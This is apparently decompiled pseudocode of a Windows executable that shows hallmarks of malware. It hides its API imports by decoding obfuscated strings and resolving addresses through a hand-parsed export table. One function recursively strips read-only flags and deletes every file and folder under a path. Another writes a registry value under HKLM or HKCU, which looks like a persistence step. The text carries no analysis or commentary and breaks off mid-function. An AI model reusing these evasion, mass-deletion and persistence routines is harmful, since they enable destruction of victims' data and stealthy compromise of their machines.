typedef unsigned char   undefined;

typedef unsigned long long    GUID;
typedef pointer32 ImageBaseOffset32;

typedef unsigned char    bool;
typedef unsigned char    byte;
typedef unsigned int    dword;
typedef long long    longlong;
typedef unsigned char    uchar;
typedef unsigned int    uint;
typedef unsigned long    ulong;
typedef unsigned char    undefined1;
typedef unsigned short    undefined2;
typedef unsigned int    undefined4;
typedef unsigned long long    undefined8;
typedef unsigned short    ushort;
typedef unsigned short    wchar16;
typedef short    wchar_t;
typedef unsigned short    word;
typedef struct CLIENT_ID CLIENT_ID, *PCLIENT_ID;

struct CLIENT_ID {
    void *UniqueProcess;
    void *UniqueThread;
};

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct {
    dword OffsetToDirectory;
    dword DataIsDirectory;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion {
    dword OffsetToData;
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;
};

typedef ulong DWORD;

typedef DWORD LCTYPE;

typedef struct _FILETIME _FILETIME, *P_FILETIME;

typedef struct _FILETIME *LPFILETIME;

struct _FILETIME {
    DWORD dwLowDateTime;
    DWORD dwHighDateTime;
};

typedef uchar BYTE;

typedef void *HANDLE;

typedef HANDLE *LPHANDLE;

typedef DWORD *LPDWORD;

typedef struct HINSTANCE__ HINSTANCE__, *PHINSTANCE__;

struct HINSTANCE__ {
    int unused;
};

typedef struct _FILETIME FILETIME;

typedef int BOOL;

typedef BOOL *LPBOOL;

typedef ushort WORD;

typedef struct HINSTANCE__ *HINSTANCE;

typedef void *LPCVOID;

typedef void *LPVOID;

typedef HINSTANCE HMODULE;

typedef BYTE *LPBYTE;

typedef uint UINT;

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY IMAGE_RESOURCE_DIRECTORY_ENTRY, *PIMAGE_RESOURCE_DIRECTORY_ENTRY;

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct {
    dword NameOffset;
    dword NameIsString;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion {
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;
    dword Name;
    word Id;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY {
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion NameUnion;
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion DirectoryUnion;
};

typedef struct IMAGE_OPTIONAL_HEADER32 IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;

typedef struct IMAGE_DATA_DIRECTORY IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

struct IMAGE_DATA_DIRECTORY {
    ImageBaseOffset32 VirtualAddress;
    dword Size;
};

struct IMAGE_OPTIONAL_HEADER32 {
    word Magic;
    byte MajorLinkerVersion;
    byte MinorLinkerVersion;
    dword SizeOfCode;
    dword SizeOfInitializedData;
    dword SizeOfUninitializedData;
    ImageBaseOffset32 AddressOfEntryPoint;
    ImageBaseOffset32 BaseOfCode;
    ImageBaseOffset32 BaseOfData;
    pointer32 ImageBase;
    dword SectionAlignment;
    dword FileAlignment;
    word MajorOperatingSystemVersion;
    word MinorOperatingSystemVersion;
    word MajorImageVersion;
    word MinorImageVersion;
    word MajorSubsystemVersion;
    word MinorSubsystemVersion;
    dword Win32VersionValue;
    dword SizeOfImage;
    dword SizeOfHeaders;
    dword CheckSum;
    word Subsystem;
    word DllCharacteristics;
    dword SizeOfStackReserve;
    dword SizeOfStackCommit;
    dword SizeOfHeapReserve;
    dword SizeOfHeapCommit;
    dword LoaderFlags;
    dword NumberOfRvaAndSizes;
    struct IMAGE_DATA_DIRECTORY DataDirectory[16];
};

typedef struct IMAGE_SECTION_HEADER IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

typedef union Misc Misc, *PMisc;

typedef enum SectionFlags {
    IMAGE_SCN_TYPE_NO_PAD=8,
    IMAGE_SCN_RESERVED_0001=16,
    IMAGE_SCN_CNT_CODE=32,
    IMAGE_SCN_CNT_INITIALIZED_DATA=64,
    IMAGE_SCN_CNT_UNINITIALIZED_DATA=128,
    IMAGE_SCN_LNK_OTHER=256,
    IMAGE_SCN_LNK_INFO=512,
    IMAGE_SCN_RESERVED_0040=1024,
    IMAGE_SCN_LNK_REMOVE=2048,
    IMAGE_SCN_LNK_COMDAT=4096,
    IMAGE_SCN_GPREL=32768,
    IMAGE_SCN_MEM_16BIT=131072,
    IMAGE_SCN_MEM_PURGEABLE=131072,
    IMAGE_SCN_MEM_LOCKED=262144,
    IMAGE_SCN_MEM_PRELOAD=524288,
    IMAGE_SCN_ALIGN_1BYTES=1048576,
    IMAGE_SCN_ALIGN_2BYTES=2097152,
    IMAGE_SCN_ALIGN_4BYTES=3145728,
    IMAGE_SCN_ALIGN_8BYTES=4194304,
    IMAGE_SCN_ALIGN_16BYTES=5242880,
    IMAGE_SCN_ALIGN_32BYTES=6291456,
    IMAGE_SCN_ALIGN_64BYTES=7340032,
    IMAGE_SCN_ALIGN_128BYTES=8388608,
    IMAGE_SCN_ALIGN_256BYTES=9437184,
    IMAGE_SCN_ALIGN_512BYTES=10485760,
    IMAGE_SCN_ALIGN_1024BYTES=11534336,
    IMAGE_SCN_ALIGN_2048BYTES=12582912,
    IMAGE_SCN_ALIGN_4096BYTES=13631488,
    IMAGE_SCN_ALIGN_8192BYTES=14680064,
    IMAGE_SCN_LNK_NRELOC_OVFL=16777216,
    IMAGE_SCN_MEM_DISCARDABLE=33554432,
    IMAGE_SCN_MEM_NOT_CACHED=67108864,
    IMAGE_SCN_MEM_NOT_PAGED=134217728,
    IMAGE_SCN_MEM_SHARED=268435456,
    IMAGE_SCN_MEM_EXECUTE=536870912,
    IMAGE_SCN_MEM_READ=1073741824,
    IMAGE_SCN_MEM_WRITE=2147483648
} SectionFlags;

union Misc {
    dword PhysicalAddress;
    dword VirtualSize;
};

struct IMAGE_SECTION_HEADER {
    char Name[8];
    union Misc Misc;
    ImageBaseOffset32 VirtualAddress;
    dword SizeOfRawData;
    dword PointerToRawData;
    dword PointerToRelocations;
    dword PointerToLinenumbers;
    word NumberOfRelocations;
    word NumberOfLinenumbers;
    enum SectionFlags Characteristics;
};

typedef struct IMAGE_RESOURCE_DATA_ENTRY IMAGE_RESOURCE_DATA_ENTRY, *PIMAGE_RESOURCE_DATA_ENTRY;

struct IMAGE_RESOURCE_DATA_ENTRY {
    dword OffsetToData;
    dword Size;
    dword CodePage;
    dword Reserved;
};

typedef struct IMAGE_RESOURCE_DIRECTORY IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;

struct IMAGE_RESOURCE_DIRECTORY {
    dword Characteristics;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    word NumberOfNamedEntries;
    word NumberOfIdEntries;
};

typedef struct IMAGE_FILE_HEADER IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

struct IMAGE_FILE_HEADER {
    word Machine; // 332
    word NumberOfSections;
    dword TimeDateStamp;
    dword PointerToSymbolTable;
    dword NumberOfSymbols;
    word SizeOfOptionalHeader;
    word Characteristics;
};

typedef struct IMAGE_NT_HEADERS32 IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;

struct IMAGE_NT_HEADERS32 {
    char Signature[4];
    struct IMAGE_FILE_HEADER FileHeader;
    struct IMAGE_OPTIONAL_HEADER32 OptionalHeader;
};

typedef BOOL (*PHANDLER_ROUTINE)(DWORD);

typedef struct _STARTUPINFOA _STARTUPINFOA, *P_STARTUPINFOA;

typedef char CHAR;

typedef CHAR *LPSTR;

struct _STARTUPINFOA {
    DWORD cb;
    LPSTR lpReserved;
    LPSTR lpDesktop;
    LPSTR lpTitle;
    DWORD dwX;
    DWORD dwY;
    DWORD dwXSize;
    DWORD dwYSize;
    DWORD dwXCountChars;
    DWORD dwYCountChars;
    DWORD dwFillAttribute;
    DWORD dwFlags;
    WORD wShowWindow;
    WORD cbReserved2;
    LPBYTE lpReserved2;
    HANDLE hStdInput;
    HANDLE hStdOutput;
    HANDLE hStdError;
};

typedef struct _SECURITY_ATTRIBUTES _SECURITY_ATTRIBUTES, *P_SECURITY_ATTRIBUTES;

struct _SECURITY_ATTRIBUTES {
    DWORD nLength;
    LPVOID lpSecurityDescriptor;
    BOOL bInheritHandle;
};

typedef struct _STARTUPINFOA *LPSTARTUPINFOA;

typedef struct _OVERLAPPED _OVERLAPPED, *P_OVERLAPPED;

typedef ulong ULONG_PTR;

typedef union _union_518 _union_518, *P_union_518;

typedef struct _struct_519 _struct_519, *P_struct_519;

typedef void *PVOID;

struct _struct_519 {
    DWORD Offset;
    DWORD OffsetHigh;
};

union _union_518 {
    struct _struct_519 s;
    PVOID Pointer;
};

struct _OVERLAPPED {
    ULONG_PTR Internal;
    ULONG_PTR InternalHigh;
    union _union_518 u;
    HANDLE hEvent;
};

typedef struct _SYSTEMTIME _SYSTEMTIME, *P_SYSTEMTIME;

struct _SYSTEMTIME {
    WORD wYear;
    WORD wMonth;
    WORD wDayOfWeek;
    WORD wDay;
    WORD wHour;
    WORD wMinute;
    WORD wSecond;
    WORD wMilliseconds;
};

typedef struct _OVERLAPPED *LPOVERLAPPED;

typedef struct _SECURITY_ATTRIBUTES *LPSECURITY_ATTRIBUTES;

typedef struct _SYSTEMTIME *LPSYSTEMTIME;

typedef struct _MEMORY_BASIC_INFORMATION _MEMORY_BASIC_INFORMATION, *P_MEMORY_BASIC_INFORMATION;

typedef ULONG_PTR SIZE_T;

struct _MEMORY_BASIC_INFORMATION {
    PVOID BaseAddress;
    PVOID AllocationBase;
    DWORD AllocationProtect;
    SIZE_T RegionSize;
    DWORD State;
    DWORD Protect;
    DWORD Type;
};

typedef struct _CONTEXT _CONTEXT, *P_CONTEXT;

typedef struct _CONTEXT CONTEXT;

typedef struct _FLOATING_SAVE_AREA _FLOATING_SAVE_AREA, *P_FLOATING_SAVE_AREA;

typedef struct _FLOATING_SAVE_AREA FLOATING_SAVE_AREA;

struct _FLOATING_SAVE_AREA {
    DWORD ControlWord;
    DWORD StatusWord;
    DWORD TagWord;
    DWORD ErrorOffset;
    DWORD ErrorSelector;
    DWORD DataOffset;
    DWORD DataSelector;
    BYTE RegisterArea[80];
    DWORD Cr0NpxState;
};

struct _CONTEXT {
    DWORD ContextFlags;
    DWORD Dr0;
    DWORD Dr1;
    DWORD Dr2;
    DWORD Dr3;
    DWORD Dr6;
    DWORD Dr7;
    FLOATING_SAVE_AREA FloatSave;
    DWORD SegGs;
    DWORD SegFs;
    DWORD SegEs;
    DWORD SegDs;
    DWORD Edi;
    DWORD Esi;
    DWORD Ebx;
    DWORD Edx;
    DWORD Ecx;
    DWORD Eax;
    DWORD Ebp;
    DWORD Eip;
    DWORD SegCs;
    DWORD EFlags;
    DWORD Esp;
    DWORD SegSs;
    BYTE ExtendedRegisters[512];
};

typedef struct _EXCEPTION_RECORD _EXCEPTION_RECORD, *P_EXCEPTION_RECORD;

typedef struct _EXCEPTION_RECORD EXCEPTION_RECORD;

typedef EXCEPTION_RECORD *PEXCEPTION_RECORD;

struct _EXCEPTION_RECORD {
    DWORD ExceptionCode;
    DWORD ExceptionFlags;
    struct _EXCEPTION_RECORD *ExceptionRecord;
    PVOID ExceptionAddress;
    DWORD NumberParameters;
    ULONG_PTR ExceptionInformation[15];
};

typedef wchar_t WCHAR;

typedef CHAR *LPCSTR;

typedef struct _MEMORY_BASIC_INFORMATION *PMEMORY_BASIC_INFORMATION;

typedef long LONG;

typedef LONG *PLONG;

typedef CHAR *LPCH;

typedef WCHAR *LPWSTR;

typedef CONTEXT *PCONTEXT;

typedef WCHAR *LPCWSTR;

typedef DWORD LCID;

typedef struct IMAGE_DOS_HEADER IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

struct IMAGE_DOS_HEADER {
    char e_magic[2]; // Magic number
    word e_cblp; // Bytes of last page
    word e_cp; // Pages in file
    word e_crlc; // Relocations
    word e_cparhdr; // Size of header in paragraphs
    word e_minalloc; // Minimum extra paragraphs needed
    word e_maxalloc; // Maximum extra paragraphs needed
    word e_ss; // Initial (relative) SS value
    word e_sp; // Initial SP value
    word e_csum; // Checksum
    word e_ip; // Initial IP value
    word e_cs; // Initial (relative) CS value
    word e_lfarlc; // File address of relocation table
    word e_ovno; // Overlay number
    word e_res[4][4]; // Reserved words
    word e_oemid; // OEM identifier (for e_oeminfo)
    word e_oeminfo; // OEM information; e_oemid specific
    word e_res2[10][10]; // Reserved words
    dword e_lfanew; // File address of new exe header
    byte e_program[64]; // Actual DOS program
};

typedef struct _EXCEPTION_POINTERS _EXCEPTION_POINTERS, *P_EXCEPTION_POINTERS;

struct _EXCEPTION_POINTERS {
    PEXCEPTION_RECORD ExceptionRecord;
    PCONTEXT ContextRecord;
};




int FUN_00401000(short *param_1,byte *param_2)

{
  byte bVar1;
  int iVar2;
  char cVar6;
  int iVar3;
  byte *pbVar4;
  uint uVar5;
  byte *pbVar7;
  int iVar8;
  int iVar9;
  
  if (*param_1 == 0x5a4d) {
    if (*(int *)(*(int *)(param_1 + 0x1e) + (int)param_1) == 0x4550) {
      iVar3 = ((int *)(*(int *)(param_1 + 0x1e) + (int)param_1))[0x1e];
      iVar2 = *(int *)((int)param_1 + iVar3 + 0x18);
      if (iVar2 == 0) {
        iVar3 = -1;
      }
      else {
        iVar8 = 0;
        iVar9 = -1;
        if (0 < iVar2) {
          do {
            pbVar4 = (byte *)(*(int *)((int)param_1 +
                                      iVar8 * 4 + *(int *)((int)param_1 + iVar3 + 0x20)) +
                             (int)param_1);
            pbVar7 = param_2;
            while( true ) {
              bVar1 = *pbVar7;
              cVar6 = *pbVar4 - bVar1;
              uVar5 = (uint)CONCAT11(cVar6,bVar1);
              if (cVar6 != '\0') break;
              if (bVar1 == 0) goto LAB_004010a8;
              pbVar7 = pbVar7 + 1;
              pbVar4 = pbVar4 + 1;
            }
            uVar5 = (uint)(*pbVar4 < bVar1);
            uVar5 = (1 - uVar5) - (uint)(uVar5 != 0);
LAB_004010a8:
            iVar9 = iVar8;
            if (uVar5 == 0) break;
            iVar8 = iVar8 + 1;
            iVar9 = -1;
          } while (iVar8 < iVar2);
        }
        if (iVar9 == 0xffff) {
          iVar3 = -1;
        }
        else {
          iVar3 = (uint)*(ushort *)
                         ((int)param_1 + iVar9 * 2 + *(int *)((int)param_1 + iVar3 + 0x24)) +
                  *(int *)((int)param_1 + iVar3 + 0x10);
        }
      }
    }
    else {
      iVar3 = -1;
    }
  }
  else {
    iVar3 = -1;
  }
  return iVar3;
}



int FUN_004010e0(short *param_1,uint param_2)

{
  uint uVar1;
  int iVar2;
  
  if (*param_1 == 0x5a4d) {
    if (*(int *)(*(int *)(param_1 + 0x1e) + (int)param_1) == 0x4550) {
      iVar2 = ((int *)(*(int *)(param_1 + 0x1e) + (int)param_1))[0x1e];
      uVar1 = *(uint *)((int)param_1 + iVar2 + 0x10);
      if ((param_2 < uVar1) || (*(uint *)((int)param_1 + iVar2 + 0x14) < param_2 - uVar1)) {
        iVar2 = 0;
      }
      else {
        iVar2 = *(int *)((int)param_1 +
                        (param_2 - *(int *)((int)param_1 + iVar2 + 0x10)) * 4 +
                        *(int *)((int)param_1 + iVar2 + 0x1c)) + (int)param_1;
      }
    }
    else {
      iVar2 = 0;
    }
  }
  else {
    iVar2 = 0;
  }
  return iVar2;
}



void FUN_00401150(void)

{
  uint uVar1;
  byte local_36 [50];
  
  FUN_004035b0((int)local_36,0x40b5a8,'\0');
  DAT_0040e224 = GetModuleHandleA((LPCSTR)local_36);
  FUN_004035b0((int)local_36,0x40b599,'\0');
  uVar1 = FUN_00401000((short *)DAT_0040e224,local_36);
  DAT_0040d000 = (code *)FUN_004010e0((short *)DAT_0040e224,uVar1);
  FUN_004035b0((int)local_36,0x40b588,'\0');
  DAT_0040d00c = (*DAT_0040d000)(DAT_0040e224,local_36);
  FUN_004035b0((int)local_36,0x40b57b,'\0');
  DAT_0040d004 = (*DAT_0040d000)(DAT_0040e224,local_36);
  FUN_004035b0((int)local_36,0x40b56f,'\0');
  DAT_0040d008 = (*DAT_0040d000)(DAT_0040e224,local_36);
  FUN_004035b0((int)local_36,0x40b55c,'\0');
  DAT_0040d01c = (*DAT_0040d000)(DAT_0040e224,local_36);
  FUN_004035b0((int)local_36,0x40b54b,'\0');
  DAT_0040d030 = (*DAT_0040d000)(DAT_0040e224,local_36);
  FUN_004035b0((int)local_36,0x40b538,'\0');
  DAT_0040d034 = (*DAT_0040d000)(DAT_0040e224,local_36);
  FUN_004035b0((int)local_36,0x40b520,'\0');
  DAT_0040d038 = (*DAT_0040d000)(DAT_0040e224,local_36);
  FUN_004035b0((int)local_36,0x40b516,'\0');
  DAT_0040d044 = (*DAT_0040d000)(DAT_0040e224,local_36);
  return;
}



void FUN_004012e0(void)

{
  undefined local_36 [50];
  
  FUN_004035b0((int)local_36,0x40b507,'\0');
  DAT_0040d010 = (*DAT_0040d000)(DAT_0040e224,local_36);
  FUN_004035b0((int)local_36,0x40b4f9,'\0');
  DAT_0040d014 = (*DAT_0040d000)(DAT_0040e224,local_36);
  FUN_004035b0((int)local_36,0x40b4ef,'\0');
  DAT_0040d018 = (*DAT_0040d000)(DAT_0040e224,local_36);
  FUN_004035b0((int)local_36,0x40b4de,'\0');
  DAT_0040d020 = (*DAT_0040d000)(DAT_0040e224,local_36);
  FUN_004035b0((int)local_36,0x40b4d2,'\0');
  DAT_0040d024 = (*DAT_0040d000)(DAT_0040e224,local_36);
  FUN_004035b0((int)local_36,0x40b4c4,'\0');
  DAT_0040d028 = (*DAT_0040d000)(DAT_0040e224,local_36);
  FUN_004035b0((int)local_36,0x40b4ac,'\0');
  DAT_0040d02c = (*DAT_0040d000)(DAT_0040e224,local_36);
  FUN_004035b0((int)local_36,0x40b497,'\0');
  DAT_0040d03c = (*DAT_0040d000)(DAT_0040e224,local_36);
  FUN_004035b0((int)local_36,0x40b481,'\0');
  DAT_0040d040 = (*DAT_0040d000)(DAT_0040e224,local_36);
  FUN_004035b0((int)local_36,0x40b468,'\0');
  DAT_0040d048 = (*DAT_0040d000)(DAT_0040e224,local_36);
  FUN_004035b0((int)local_36,0x40b454,'\0');
  DAT_0040d04c = (*DAT_0040d000)(DAT_0040e224,local_36);
  FUN_004035b0((int)local_36,0x40b445,'\0');
  DAT_0040d050 = (*DAT_0040d000)(DAT_0040e224,local_36);
  FUN_004035b0((int)local_36,0x40b437,'\0');
  DAT_0040d054 = (*DAT_0040d000)(DAT_0040e224,local_36);
  FUN_004035b0((int)local_36,0x40b42b,'\0');
  DAT_0040d058 = (*DAT_0040d000)(DAT_0040e224,local_36);
  FUN_004035b0((int)local_36,0x40b41f,'\0');
  DAT_0040d05c = (*DAT_0040d000)(DAT_0040e224,local_36);
  return;
}



undefined4 FUN_00401520(byte *param_1)

{
  byte bVar1;
  char cVar3;
  uint uVar2;
  byte *pbVar4;
  byte *pbVar5;
  
  pbVar5 = &DAT_0040b41d;
  pbVar4 = param_1;
  while( true ) {
    bVar1 = *pbVar5;
    cVar3 = *pbVar4 - bVar1;
    uVar2 = (uint)CONCAT11(cVar3,bVar1);
    if (cVar3 != '\0') break;
    if (bVar1 == 0) goto LAB_00401543;
    pbVar5 = pbVar5 + 1;
    pbVar4 = pbVar4 + 1;
  }
  uVar2 = (uint)(*pbVar4 < bVar1);
  uVar2 = (1 - uVar2) - (uint)(uVar2 != 0);
LAB_00401543:
  if (uVar2 != 0) {
    pbVar4 = &DAT_0040b41a;
    while( true ) {
      bVar1 = *pbVar4;
      cVar3 = *param_1 - bVar1;
      uVar2 = (uint)CONCAT11(cVar3,bVar1);
      if (cVar3 != '\0') break;
      if (bVar1 == 0) goto LAB_00401565;
      pbVar4 = pbVar4 + 1;
      param_1 = param_1 + 1;
    }
    uVar2 = (uint)(*param_1 < bVar1);
    uVar2 = (1 - uVar2) - (uint)(uVar2 != 0);
LAB_00401565:
    if (uVar2 != 0) {
      return 0;
    }
  }
  return 1;
}



undefined4 FUN_00401580(char *param_1)

{
  char cVar1;
  bool bVar2;
  int iVar3;
  undefined4 uVar4;
  int iVar5;
  DWORD DVar6;
  char *pcVar7;
  byte local_34c [44];
  byte local_320 [276];
  char local_20c [260];
  char local_108 [260];
  
  pcVar7 = param_1;
  do {
    cVar1 = *pcVar7;
    pcVar7[(int)(local_108 + -(int)param_1)] = cVar1;
    pcVar7 = pcVar7 + 1;
  } while (cVar1 != '\0');
  FUN_00403780(local_108,"\\*");
  pcVar7 = param_1;
  do {
    cVar1 = *pcVar7;
    pcVar7[(int)(local_20c + -(int)param_1)] = cVar1;
    pcVar7 = pcVar7 + 1;
  } while (cVar1 != '\0');
  FUN_00403780(local_20c,"\\");
  iVar3 = (*DAT_0040d010)(local_108,local_34c);
  if (iVar3 == -1) {
    uVar4 = 0;
  }
  else {
    pcVar7 = local_20c;
    iVar5 = -(int)pcVar7;
    do {
      cVar1 = *pcVar7;
      pcVar7[(int)(local_108 + iVar5)] = cVar1;
      pcVar7 = pcVar7 + 1;
    } while (cVar1 != '\0');
    bVar2 = true;
    do {
      iVar5 = (*DAT_0040d014)(iVar3,local_34c);
      if (iVar5 == 0) {
        DVar6 = GetLastError();
        if (DVar6 != 0x12) {
          (*DAT_0040d018)(iVar3);
          return 0;
        }
        bVar2 = false;
      }
      else {
        iVar5 = FUN_00401520(local_320);
        if (iVar5 == 0) {
          FUN_00403780(local_20c,(char *)local_320);
          if ((local_34c[0] & 0x10) == 0) {
            if ((local_34c[0] & 1) != 0) {
              (*DAT_0040d01c)(local_20c,0x80);
            }
            iVar5 = (*DAT_0040d024)(local_20c);
            if (iVar5 == 0) {
              (*DAT_0040d018)(iVar3);
              return 0;
            }
            pcVar7 = local_108;
            iVar5 = -(int)pcVar7;
            do {
              cVar1 = *pcVar7;
              pcVar7[(int)(local_20c + iVar5)] = cVar1;
              pcVar7 = pcVar7 + 1;
            } while (cVar1 != '\0');
          }
          else {
            iVar5 = FUN_00401580(local_20c);
            if (iVar5 == 0) {
              (*DAT_0040d018)(iVar3);
              return 0;
            }
            (*DAT_0040d020)(local_20c);
            pcVar7 = local_108;
            iVar5 = -(int)pcVar7;
            do {
              cVar1 = *pcVar7;
              pcVar7[(int)(local_20c + iVar5)] = cVar1;
              pcVar7 = pcVar7 + 1;
            } while (cVar1 != '\0');
          }
        }
      }
    } while (bVar2);
    (*DAT_0040d018)(iVar3);
    uVar4 = (*DAT_0040d020)(param_1);
  }
  return uVar4;
}



undefined4 FUN_00401740(int param_1,undefined4 param_2)

{
  int iVar1;
  undefined4 uVar2;
  int iVar3;
  undefined local_3a [50];
  undefined4 local_8;
  
  FUN_004035b0((int)local_3a,0x40b408,'\0');
  iVar1 = (*DAT_0040d00c)(local_3a);
  if (iVar1 == 0) {
    iVar1 = (*DAT_0040d004)(local_3a);
  }
  FUN_004035b0((int)local_3a,0x40b3fa,'\0');
  DAT_0040d064 = (code *)(*DAT_0040d000)(iVar1,local_3a);
  FUN_004035b0((int)local_3a,0x40b3eb,'\0');
  DAT_0040d068 = (code *)(*DAT_0040d000)(iVar1,local_3a);
  FUN_004035b0((int)local_3a,0x40b3df,'\0');
  DAT_0040d074 = (code *)(*DAT_0040d000)(iVar1,local_3a);
  if ((DAT_0040d064 == (code *)0x0) || (DAT_0040d068 == (code *)0x0)) {
    uVar2 = 0;
  }
  else {
    (*DAT_0040d064)(0x80000002,&DAT_0040e228,0,2,&local_8);
    iVar3 = -1;
    do {
      iVar3 = iVar3 + 1;
    } while (*(char *)(param_1 + iVar3) != '\0');
    iVar3 = (*DAT_0040d068)(local_8,param_2,0,1,param_1,iVar3);
    if (iVar3 == 0) {
      uVar2 = 1;
    }
    else {
      (*DAT_0040d074)(local_8);
      (*DAT_0040d064)(0x80000001,&DAT_0040e228,0,2,&local_8);
      iVar3 = -1;
      do {
        iVar3 = iVar3 + 1;
      } while (*(char *)(param_1 + iVar3) != '\0');
      iVar3 = (*DAT_0040d068)(local_8,param_2,0,1,param_1,iVar3);
      uVar2 = 0;
      if (iVar3 == 0) {
        uVar2 = 1;
      }
    }
    (*DAT_0040d074)(local_8);
    if (iVar1 != 0) {
      (*DAT_0040d008)(iVar1);
    }
  }
  return uVar2;
}



undefined FUN_004018a0(undefined4 param_1,undefined4 param_2,int param_3,int param_4,int param_5)

{
  char cVar1;
  int iVar2;
  int iVar3;
  char *pcVar4;
  char cVar5;
  undefined local_105;
  undefined local_fe [50];
  undefined local_cc [50];
  undefined local_9a [100];
  undefined local_36 [50];
  
  FUN_004035b0((int)local_36,0x40b3d3,'\0');
  iVar2 = (*DAT_0040d00c)();
  if (iVar2 == 0) {
    iVar2 = (*DAT_0040d004)();
  }
  FUN_004035b0((int)local_36,0x40b3c5,'\0');
  DAT_0040d078 = (code *)(*DAT_0040d000)();
  FUN_004035b0((int)local_36,0x40b3b4,'\0');
  DAT_0040d07c = (code *)(*DAT_0040d000)();
  FUN_004035b0((int)local_36,0x40b3a8,'\0');
  DAT_0040d084 = (code *)(*DAT_0040d000)();
  if (((DAT_0040d078 == (code *)0x0) || (DAT_0040d07c == (code *)0x0)) ||
     (DAT_0040d084 == (code *)0x0)) {
    local_105 = 0;
  }
  else {
    FUN_004035b0((int)local_fe,param_3,'\0');
    FUN_004035b0((int)local_cc,param_4,'\0');
    FUN_004035b0((int)local_9a,param_5,'\0');
    (*DAT_0040d078)();
    (*DAT_0040d07c)();
    for (cVar5 = '\0'; local_105 = 0, cVar5 < '\x03'; cVar5 = cVar5 + '\x01') {
      iVar3 = (*DAT_0040d084)();
      if (iVar3 == 1) {
        local_105 = 1;
        break;
      }
      Sleep(1000);
    }
    FUN_004035b0((int)local_36,0x40b394,'\0');
    DAT_0040d088 = (code *)(*DAT_0040d000)();
    if (DAT_0040d088 != (code *)0x0) {
      (*DAT_0040d088)();
      (*DAT_0040d088)();
    }
    for (cVar5 = '\0'; cVar5 < '\x03'; cVar5 = cVar5 + '\x01') {
      pcVar4 = "01234567890123456783136469012345678";
      do {
        cVar1 = *pcVar4;
        (&stack0xffbf4b92 + cVar5 * 0x32)[(int)pcVar4] = cVar1;
        pcVar4 = pcVar4 + 1;
      } while (cVar1 != '\0');
    }
    if (iVar2 != 0) {
      (*DAT_0040d008)();
    }
  }
  return local_105;
}



undefined FUN_00401ab0(undefined4 param_1,undefined4 param_2,int param_3,int param_4,int param_5)

{
  char cVar1;
  int iVar2;
  int iVar3;
  char *pcVar4;
  char cVar5;
  undefined local_105;
  undefined local_fe [50];
  undefined local_cc [50];
  undefined local_9a [100];
  undefined local_36 [50];
  
  FUN_004035b0((int)local_36,0x40b3d3,'\0');
  iVar2 = (*DAT_0040d00c)();
  if (iVar2 == 0) {
    iVar2 = (*DAT_0040d004)();
  }
  FUN_004035b0((int)local_36,0x40b3c5,'\0');
  DAT_0040d078 = (code *)(*DAT_0040d000)();
  FUN_004035b0((int)local_36,0x40b3b4,'\0');
  DAT_0040d07c = (code *)(*DAT_0040d000)();
  FUN_004035b0((int)local_36,0x40b364,'\0');
  DAT_0040d080 = (code *)(*DAT_0040d000)();
  if (((DAT_0040d078 == (code *)0x0) || (DAT_0040d07c == (code *)0x0)) ||
     (DAT_0040d080 == (code *)0x0)) {
    local_105 = 0;
  }
  else {
    FUN_004035b0((int)local_fe,param_3,'\0');
    FUN_004035b0((int)local_cc,param_4,'\0');
    FUN_004035b0((int)local_9a,param_5,'\0');
    (*DAT_0040d078)();
    (*DAT_0040d07c)();
    for (cVar5 = '\0'; local_105 = 0, cVar5 < '\x03'; cVar5 = cVar5 + '\x01') {
      iVar3 = (*DAT_0040d080)();
      if (iVar3 == 1) {
        local_105 = 1;
        break;
      }
      Sleep(1000);
    }
    FUN_004035b0((int)local_36,0x40b394,'\0');
    DAT_0040d088 = (code *)(*DAT_0040d000)();
    if (DAT_0040d088 != (code *)0x0) {
      (*DAT_0040d088)();
      (*DAT_0040d088)();
    }
    for (cVar5 = '\0'; cVar5 < '\x03'; cVar5 = cVar5 + '\x01') {
      pcVar4 = "01234567890123456789012345678321456";
      do {
        cVar1 = *pcVar4;
        (&stack0xffbf4bc2 + cVar5 * 0x32)[(int)pcVar4] = cVar1;
        pcVar4 = pcVar4 + 1;
      } while (cVar1 != '\0');
    }
    if (iVar2 != 0) {
      (*DAT_0040d008)();
    }
  }
  return local_105;
}



undefined * FUN_00401cc0(undefined4 param_1)

{
  int iVar1;
  code *pcVar2;
  undefined local_36 [50];
  
  FUN_004035b0((int)local_36,0x40b334,'\0');
  iVar1 = (*DAT_0040d00c)(local_36);
  if (iVar1 == 0) {
    iVar1 = (*DAT_0040d004)(local_36);
  }
